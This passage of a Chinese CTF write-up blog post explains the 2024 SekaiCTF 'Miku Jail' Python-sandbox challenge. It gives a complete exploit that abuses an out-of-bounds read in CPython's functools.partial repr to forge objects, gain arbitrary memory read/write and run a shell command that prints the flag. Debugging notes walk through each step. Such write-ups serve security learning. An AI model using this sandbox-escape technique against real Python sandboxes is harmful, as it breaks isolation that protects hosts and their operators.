+<img src="/2024/08/31/sekai2024jailwp/fake_byte_array.png" srcset="/img/loading.gif" lazyload class title="fake_byte_array"></li>
+</ul>
+<h2 id="利用partial-repr的index越界"><a href="#利用partial-repr的index越界" class="headerlink" title="利用partial_repr的index越界"></a>利用partial_repr的index越界</h2><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># based on chilaxans functools exp</span><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><span class="hljs-keyword">import</span> sys<br><br>length = <span class="hljs-number">119</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pair</span>():<br>    <span class="hljs-comment"># heap grooming</span><br>    <span class="hljs-comment"># returns tuple, bytearray pair where array exists directly after end of tuple</span><br>    fill = <span class="hljs-built_in">bytes</span>((length // <span class="hljs-number">2</span>) * <span class="hljs-built_in">tuple</span>.__itemsize__)<br>    r = <span class="hljs-built_in">range</span>((length // <span class="hljs-number">2</span>) - <span class="hljs-number">5</span>)  <span class="hljs-comment"># do these now so that we need less allocs later</span><br>    old = []  <span class="hljs-comment"># store failures to increase memory pressure</span><br>    t0 = <span class="hljs-built_in">tuple</span>(r)<br>    b0 = <span class="hljs-built_in">bytearray</span>(fill)<br>    t1 = <span class="hljs-built_in">tuple</span>(r)<br>    b1 = <span class="hljs-built_in">bytearray</span>(fill)<br>    t = <span class="hljs-built_in">tuple</span>(r)<br>    b = <span class="hljs-built_in">bytearray</span>(fill)<br>    <span class="hljs-keyword">return</span> t, b<br><br><br>p = partial(<span class="hljs-built_in">id</span>)<br><br>bytearray_mem = <span class="hljs-built_in">memoryview</span>(<span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytearray</span>.__basicsize__)).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>bytearray_mem[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># refcount</span><br>bytearray_mem[<span class="hljs-number">1</span>] = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">bytearray</span>.__call__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># ob_type</span><br>bytearray_mem[<span class="hljs-number">2</span>] = (<span class="hljs-number">2</span> ** (<span class="hljs-built_in">tuple</span>.__itemsize__ * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>  <span class="hljs-comment"># ob_size</span><br>bytearray_mem = bytearray_mem.tobytes()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br><br><br>Fake_mem = <span class="hljs-built_in">memoryview</span>(<span class="hljs-built_in">bytearray</span>(Fake.__basicsize__)).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>Fake_mem[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># refcount</span><br>Fake_mem[<span class="hljs-number">1</span>] = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake.__call__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># ob_type</span><br>Fake_mem[<span class="hljs-number">2</span>] = (<br>    <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;bytearray_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">bytes</span>.__basicsize__ - <span class="hljs-number">1</span><br>)<br>Fake_mem = Fake_mem.tobytes()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeirdRepr</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> b  <span class="hljs-comment"># otherwise it is freed after function and that causes more problems</span><br>        t, b = make_pair()<br>        p.__setstate__((<span class="hljs-built_in">id</span>, t, &#123;&#125;, &#123;&#125;))<br>        mem = <span class="hljs-built_in">memoryview</span>(b).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mem)):<br>            mem[i] = (<br>                <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                + <span class="hljs-built_in">bytes</span>.__basicsize__<br>                - <span class="hljs-number">1</span><br>            )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wack&quot;</span><br><br><br>p.__setstate__((<span class="hljs-built_in">id</span>, (WeirdRepr(),) * length, &#123;&#125;, &#123;&#125;))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">repr</span>(p)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    mem = e.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">import</span> sys<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>a_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;a&#x27;</span>.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>python_base = a_addr - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br>ob_idx = py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span><br><br>mem[ob_idx : ob_idx + <span class="hljs-number">8</span>] = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">import</span> os<br><br>os.system(<span class="hljs-string">&quot;cat /flag*.txt&quot;</span>)<br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><ul>
+<li><p>repr用于返回一个对象的“官方”字符串表示形式，自定义对象可以定义__repr__自定义实现</p>
+</li>
+<li><p>functools.partial可用于包装函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fa</span>(<span class="hljs-params">a, b, c</span>):<br>    <span class="hljs-keyword">return</span> a + b + c<br><br>p = partial(fa, <span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>partial的repr由partial_repr函数实现，有这么一部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">assert (PyTuple_Check(pto-&gt;args));<br>n = PyTuple_GET_SIZE(pto-&gt;args);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    Py_SETREF(arglist, PyUnicode_FromFormat(<span class="hljs-string">&quot;%U, %R&quot;</span>, arglist,<br>                                    PyTuple_GET_ITEM(pto-&gt;args, i)));<br>    <span class="hljs-keyword">if</span> (arglist == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">goto</span> done;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>遍历pto-&gt;args元组，获取其中的PyObject</li>
+<li>PyUnicode_FromFormat会递归调用pto-&gt;args[i]的__repr__</li>
+</ul>
+</li>
+</ul>
+<p>如果此时修改pto-&gt;args，改为一个更小的元组就会造成index越界</p>
+<ul>
+<li><p>先利用bytearray_mem伪造一个PyByteArrayObject</p>
+<img src="/2024/08/31/sekai2024jailwp/bytearray_mem1.png" srcset="/img/loading.gif" lazyload class title="bytearray_mem1">
+
+<img src="/2024/08/31/sekai2024jailwp/bytearray_mem2.png" srcset="/img/loading.gif" lazyload class title="bytearray_mem2">
+</li>
+<li><p>再利用Fake_mem伪造一个Fake PyObject</p>
+<img src="/2024/08/31/sekai2024jailwp/fake_mem1.png" srcset="/img/loading.gif" lazyload class title="fake_mem1">
+
+<img src="/2024/08/31/sekai2024jailwp/fake_mem2.png" srcset="/img/loading.gif" lazyload class title="fake_mem2">
+
+<ul>
+<li><p>class Fake的value属性是__slots__的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>这个属性直接存储在PyObject之后</p>
+<img src="/2024/08/31/sekai2024jailwp/fake_mem3.png" srcset="/img/loading.gif" lazyload class title="fake_mem3"></li>
+</ul>
+</li>
+<li><p>functools.partial的__repr__使用partial_repr实现，__setstate__使用partial_setstate实现</p>
+<ul>
+<li><p>首先将args填满class WeirdRepr，大小为119</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.__setstate__((<span class="hljs-built_in">id</span>, (WeirdRepr(),) * length, &#123;&#125;, &#123;&#125;))<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/31/sekai2024jailwp/fake_buffer0.png" srcset="/img/loading.gif" lazyload class title="fake_buffer">
+</li>
+<li><p>repr(p)时会调用WeirdRepr.__repr__，将args改为大小54的元组</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pair</span>():<br>    fill = <span class="hljs-built_in">bytes</span>((length // <span class="hljs-number">2</span>) * <span class="hljs-built_in">tuple</span>.__itemsize__)<br>    r = <span class="hljs-built_in">range</span>((length // <span class="hljs-number">2</span>) - <span class="hljs-number">5</span>)<br>    <br>	<span class="hljs-comment"># ……</span><br>    <br>    t = <span class="hljs-built_in">tuple</span>(r)<br>    b = <span class="hljs-built_in">bytearray</span>(fill)<br>    <span class="hljs-keyword">return</span> t, b<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>元组内容为PyLongObject 1 2 3 4……</p>
+<img src="/2024/08/31/sekai2024jailwp/fake_buffer1.png" srcset="/img/loading.gif" lazyload class title="fake_buffer1">
+</li>
+<li><p>这个元组之后跟的就是PyByteArrayObject的buf</p>
+<img src="/2024/08/31/sekai2024jailwp/fake_buffer2.png" srcset="/img/loading.gif" lazyload class title="fake_buffer2">
+
+<p>这部分内存之后被填满了指向Fake_mem的指针</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeirdRepr</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> b<br>        t, b = make_pair()<br>        p.__setstate__((<span class="hljs-built_in">id</span>, t, &#123;&#125;, &#123;&#125;))<br>        mem = <span class="hljs-built_in">memoryview</span>(b).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mem)):<br>            mem[i] = (<br>                <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                + <span class="hljs-built_in">bytes</span>.__basicsize__<br>                - <span class="hljs-number">1</span><br>            )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wack&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>再回到partial_repr，此时args已被修改，越界对Fake调用__repr__</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br></code></pre></td></tr></table></figure>
+
+<p>Fake.value经过伪造指向fake bytearray，通过try expect就获取到了这个ob_size为0x7fffffffffffffff的PyByteArrayObject，可以对内存进行任意读写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">repr</span>(p)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    mem = e.args[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+        <a href="/tags/pyjail/" class="print-no-link">#pyjail</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024 sekaiCTF Miku Jail wp</div>
+      <div>http://akaieurus.github.io/2024/08/31/sekai2024jailwp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/23/flower/" title="炫耀一下漂亮花花~">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">炫耀一下漂亮花花~</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/27/sekai2024pwnwp/" title="2024 sekaiCTF pwn wp part1">
+                        <span class="hidden-mobile">2024 sekaiCTF pwn wp part1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
